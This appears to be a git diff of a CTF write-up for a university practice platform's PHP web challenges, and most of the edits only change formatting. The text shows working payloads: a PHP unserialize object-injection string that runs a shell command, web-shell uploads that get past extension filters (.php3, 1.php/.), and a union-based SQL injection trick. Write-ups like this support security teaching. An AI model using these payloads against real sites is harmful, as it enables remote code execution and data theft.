@@ -10,7 +10,7 @@ TCTF v2 is the CTF practice platform for MasonCC, and I have put up some web cha
 
 ## Cover Peasy
 Level: :star:  
-see source code in ./easypeasy.txt  
+see source code in `./easypeasy.txt`  
 ```php
 <meta charset="utf-8">
 <?php
@@ -42,15 +42,16 @@ if (empty($_GET['str'])) {
 ## PHP un Siri ME
 Level: :star::star:  
 The difficulty of this challenge is your truely understand of unserialization.  
+Payload: `?str=O:5:"pwnch":1:{s:2:"hi";O:7:"pickle2":1:{s:6:"%00*%00hi2";s:10:"echo `ls`;";}}`
 
 ## Unicorn and Lion
 Level: :star:  
 This is a very classic challenge for Union-based mysql injection.  
 I won't keep source code of file in this place.  
-You need to find each answer of problem from the **faq.php**.  
+You need to find each answer of problem from the `faq.php`.  
 What's worth paying attention to is that you need to separate each results of answer.  
-Here is the trick ```group_concat(column name separator 'x')```  
-that ```x``` can help you separate each results.  
+Here is the trick `group_concat(column name separator 'x')`  
+that `x` can help you separate each results.  
 ![union](https://github.com/shinmao/CTF-writeups/blob/master/tctf-masoncc-writeup/screenshot/union%20and%20lion.png)
 
 ## Shorter shell
@@ -76,8 +77,8 @@ if(preg_match('/.+\.php$/i', $filename)){
     fclose($f);
 }
 ```
-Payload: ```url/?content=<?php system('ls');?>&filename=1.php3```  
-Associated knowledge: ```.php4```,```php5```,```php7```,```pht```,```phtml``` can also work.  
+Payload: `url/?content=<?php system('ls');?>&filename=1.php3`  
+Associated knowledge: `.php4`,`php5`,`php7`,`pht`,`phtml` can also work.  
 
 ## Apache2 giv u new Shell
 Level: :star:  
@@ -102,7 +103,7 @@ if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
     fclose($f);
 }
 ```
-Payload: ```url/?content=<?php system('ls');?>&filename=1.php/.```  
+Payload: `url/?content=<?php system('ls');?>&filename=1.php/.`  
 
 ## Destroy chllenge with ur shell
 Level: :star::star::star:  
